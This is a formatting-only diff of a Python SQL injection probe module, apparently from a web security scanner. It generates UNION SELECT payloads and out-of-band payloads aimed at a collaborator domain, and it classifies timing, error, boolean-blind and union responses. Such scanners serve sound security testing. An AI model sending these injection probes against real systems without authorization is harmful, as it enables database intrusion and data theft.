@@ -64,8 +64,7 @@ DATABASE_SPECIFIC_PAYLOADS: dict[str, list[tuple[str, str]]] = {
 
 
 UNION_PAYLOADS: list[tuple[str, str]] = [
-    (f"UNION SELECT {'NULL,' * i}NULL--", f"union_null_{i+1}col")
-    for i in range(20)
+    (f"UNION SELECT {'NULL,' * i}NULL--", f"union_null_{i + 1}col") for i in range(20)
 ]
 
 
@@ -138,10 +137,7 @@ def _build_boolean_payloads() -> list[str]:
 
 def _build_oob_payloads(collaborator: str) -> list[str]:
     domain = collaborator.replace("http://", "").replace("https://", "").rstrip("/")
-    return [
-        payload.replace("collaborator.oastify.com", domain)
-        for payload, _ in OOB_PAYLOADS
-    ]
+    return [payload.replace("collaborator.oastify.com", domain) for payload, _ in OOB_PAYLOADS]
 
 
 def _detect_database_type(
@@ -212,15 +208,14 @@ def sqli_advanced_probe(
             continue
 
         from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
+
         parsed = urlparse(url)
         query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
         if not query_pairs:
             continue
 
         sql_params = [
-            (i, k, v)
-            for i, (k, v) in enumerate(query_pairs)
-            if k.lower() in SQL_PARAM_NAMES
+            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in SQL_PARAM_NAMES
         ]
         if not sql_params:
             continue
@@ -234,7 +229,9 @@ def sqli_advanced_probe(
             baseline_status = None
             baseline_len = 0
             baseline_headers = {}
-        db_type = _detect_database_type(url, str(baseline.get("body_text") or "") if baseline else "", baseline_headers)
+        db_type = _detect_database_type(
+            url, str(baseline.get("body_text") or "") if baseline else "", baseline_headers
+        )
 
         url_findings: list[dict[str, Any]] = []
         url_issues: list[str] = []
@@ -283,7 +280,9 @@ def sqli_advanced_probe(
                 issues_for_hit: list[str] = []
 
                 is_timing = elapsed_ms > 4000
-                is_error = bool(error_match) or (status == 500 and baseline_status is not None and baseline_status < 400)
+                is_error = bool(error_match) or (
+                    status == 500 and baseline_status is not None and baseline_status < 400
+                )
                 is_oob = "oob" in payload_type and elapsed_ms > 3000
                 is_boolean = "boolean" in payload_type
                 is_union = "union" in payload_type
@@ -296,7 +295,11 @@ def sqli_advanced_probe(
                     issues_for_hit.append("sqli_oob_indicator")
                 if is_boolean and status != baseline_status:
                     issues_for_hit.append("sqli_boolean_blind")
-                if is_union and abs(response_len - baseline_len) > baseline_len * 0.3 and baseline_len > 0:
+                if (
+                    is_union
+                    and abs(response_len - baseline_len) > baseline_len * 0.3
+                    and baseline_len > 0
+                ):
                     issues_for_hit.append("sqli_union_response")
 
                 if issues_for_hit:
